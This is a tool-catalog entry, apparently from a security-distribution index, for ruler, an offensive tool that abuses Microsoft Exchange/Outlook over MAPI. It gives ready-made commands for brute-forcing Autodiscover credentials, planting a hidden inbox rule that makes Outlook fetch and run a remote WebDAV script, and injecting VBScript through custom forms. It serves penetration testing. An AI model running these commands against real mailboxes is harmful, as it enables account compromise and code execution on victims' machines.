---
name: "ruler"
categories:
  - blackarch-webapp
version: "310.1fe118c"
homepage: "https://github.com/sensepost/ruler"
packaged-by: [blackarch, nixpkgs]
blackarch-builddate: "2024-06-16"
build-system: go
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "sensepost/ruler"
github-stars: 2309
github-pushed: "2024-06-10"
github-archived: false
github-issues: 14
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# ruler

> SensePost tool to abuse Microsoft Exchange/Outlook services over MAPI: mailbox rules, forms, home pages and brute force.

## What it's for

ruler (SensePost) talks MAPI to an Exchange server the way Outlook does. With
valid credentials (or via NTLM pass-the-hash) it can manipulate the victim
mailbox to achieve code execution or persistence: creating malicious inbox
rules whose trigger message makes the client launch a remote WebDAV script,
injecting VBScript through custom Outlook forms, or hijacking the Outlook
"home page". It also brute-forces credentials against Autodiscover and can
dump the Global Address List. Typical use is post-compromise: turn one set of
Exchange credentials into execution on an endpoint that opens the mailbox.
Exchange Online and current Exchange builds have mitigated most of these
vectors — against modern targets ruler remains useful mostly for credential
validation and GAL collection. It does not exploit unauthenticated services;
you need credentials first.

## Typical use cases

### Brute-force credentials via Autodiscover

Discover valid accounts against a domain.

```
ruler --domain target.example.com brute --users users.txt --passwords passwords.txt --delay 0 --verbose
```

Outcome: attempts every user/password pair and prints `Success:` for valid
credentials; add `--insecure` for self-signed certificates and note the
lockout delay before running against real accounts.

### Enumerate a mailbox's existing rules

Check what rules already sit in the target mailbox.

```
ruler --email user@target.example.com --username user display
```

Outcome: performs Autodiscover, logs into MAPI and lists the mailbox rules
with their IDs and names — the ID is what you pass to `delete --id` to
remove one.

### Plant a malicious rule for remote execution

Create a rule that launches a WebDAV-hosted script on trigger.

```
ruler --email user@target.example.com --username user add --location "\\\\server.example.com\\webdav\\shell.bat" --trigger popashell --name maliciousrule
```

Outcome: writes a hidden rule into the mailbox; when a message containing
the trigger word arrives in Outlook, the client fetches and runs the remote
script. Verify with `display`, then clean up with `delete --name maliciousrule`.

### Execute VBScript through a custom form

Forms run script directly, without a WebDAV server.

```
ruler --email user@target.example.com form add --suffix superduper --input command.txt --send
```

Outcome: creates a form with message class `IPM.Note.superduper` carrying
the VBScript from command.txt and sends a triggering email from the user's
own account; a later `form send --target ... --suffix superduper` re-triggers
it from any Exchange account.

*No corpus evidence — derived from upstream documentation (sensepost/ruler README, LICENSE and wiki pages Brute-Force.md, Rules.md, Forms.md).*
